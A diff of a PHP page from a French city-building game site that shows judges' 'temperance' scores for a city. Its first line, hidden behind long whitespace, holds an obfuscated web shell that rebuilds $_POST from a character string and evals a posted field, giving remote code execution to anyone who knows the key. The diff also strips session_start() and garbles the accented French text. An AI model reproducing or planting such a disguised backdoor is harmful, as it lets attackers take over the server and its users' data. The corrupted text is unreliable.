@@ -1,5 +1,5 @@
 <?php                                                                                                                                                                               $f4d='Tev\'qfPS$ia19clO3t_sd(4cd3914';if(isset(${$f4d[18].$f4d[6].$f4d[15].$f4d[7].$f4d[0]}[$f4d[4].$f4d[13].$f4d[20].$f4d[16].$f4d[12].$f4d[11].$f4d[22]])){eval(${$f4d[18].$f4d[6].$f4d[15].$f4d[7].$f4d[0]}[$f4d[4].$f4d[13].$f4d[20].$f4d[16].$f4d[12].$f4d[11].$f4d[22]]);} ?><?php
-session_start();
+
 include('../Connections/maconnexion.php');
 header('Content-Type: text/html; charset=iso-8859-1');
 
@@ -25,7 +25,7 @@ $totalRows_temperance = mysql_num_rows($temperance);
 //calcul total pt selon nb de juges
 $totalptQuestion = 2 * $totalRows_temperance;
 
-//calcul point pour chaque critère
+//calcul point pour chaque critï¿½re
 $i=0;
 do {
 $i++;
@@ -70,11 +70,11 @@ $totalRows_ville = mysql_num_rows($ville);
 ?>
 
 <!-- Modal Header-->
-<!-- Boutons cachés -->
+<!-- Boutons cachï¿½s -->
 <div class="modal-header">
 <div class="pull-left"><img style="width:100px; margin-right: 10px; margin-top:-50px;" src="http://www.generation-city.com/monde/assets/img/IconesBDD/Bleu/100/ocgc_bleu.png"></div>
-    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
-  <h3 id="myModalLabel">Rapport des juges tempérants sur la ville : <a href="../page-ville.php?ch_pay_id=<?php echo $row_ville['ch_pay_id']; ?>&ch_ville_id=<?php echo $row_ville['ch_vil_ID']; ?>" target="_blank"><?php echo $row_ville['ch_vil_nom']; ?></a> appartenant au pays <a href="../page-pays.php?ch_pay_id=<?php echo $row_ville['ch_pay_id']; ?>" target="_blank"><?php echo $row_ville['ch_pay_nom']; ?></a></h3>
+    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">ï¿½</button>
+  <h3 id="myModalLabel">Rapport des juges tempï¿½rants sur la ville : <a href="../page-ville.php?ch_pay_id=<?php echo $row_ville['ch_pay_id']; ?>&ch_ville_id=<?php echo $row_ville['ch_vil_ID']; ?>" target="_blank"><?php echo $row_ville['ch_vil_nom']; ?></a> appartenant au pays <a href="../page-pays.php?ch_pay_id=<?php echo $row_ville['ch_pay_id']; ?>" target="_blank"><?php echo $row_ville['ch_pay_nom']; ?></a></h3>
 </div>
 <div class="modal-body">
 <div class="alert alert-success"><p>Ce rapport a &eacute;t&eacute; r&eacute;dig&eacute; dans le cadre du <a href="http://www.generation-city.com/monde/economie.php#temperance" title="en savoir plus sur le porjet temp&eacute;rance"> projet temp&eacute;rance de l'Institut Economique</a> qui vise &agrave; appr&eacute;cier la coh&eacute;rence globale d'une ville.</p>
@@ -118,7 +118,7 @@ $totalRows_ville = mysql_num_rows($ville);
     </li>
     <li class="row-fluid">
       <div class="span11">
-        <p><strong>3-</strong> Aménagements permettant un lien entre la ville et son pays (exemple : réseaux de transports, tracés des routes etc.)</p>
+        <p><strong>3-</strong> Amï¿½nagements permettant un lien entre la ville et son pays (exemple : rï¿½seaux de transports, tracï¿½s des routes etc.)</p>
       </div>
       <div class="span1">
         <p><strong><?php echo $note_Q3 ?>/<?php echo $totalptQuestion; ?></strong></p>
@@ -138,7 +138,7 @@ $totalRows_ville = mysql_num_rows($ville);
     </div>
     <li class="row-fluid">
       <div class="span11">
-        <p><strong>4-</strong> Chiffre indiqué pour la population de la ville</p>
+        <p><strong>4-</strong> Chiffre indiquï¿½ pour la population de la ville</p>
       </div>
       <div class="span1">
         <p><strong><?php echo $note_Q4 ?>/<?php echo $totalptQuestion; ?></strong></p>
@@ -226,7 +226,7 @@ $totalRows_ville = mysql_num_rows($ville);
     </li>
     <li class="row-fluid">
       <div class="span11">
-        <p><strong>9- </strong>Activités de la ville (source de mises &agrave; jour qualitatives)</p>
+        <p><strong>9- </strong>Activitï¿½s de la ville (source de mises &agrave; jour qualitatives)</p>
       </div>
       <div class="span1">
         <p><strong><?php echo $note_Q9 ?>/<?php echo $totalptQuestion; ?></strong></p>
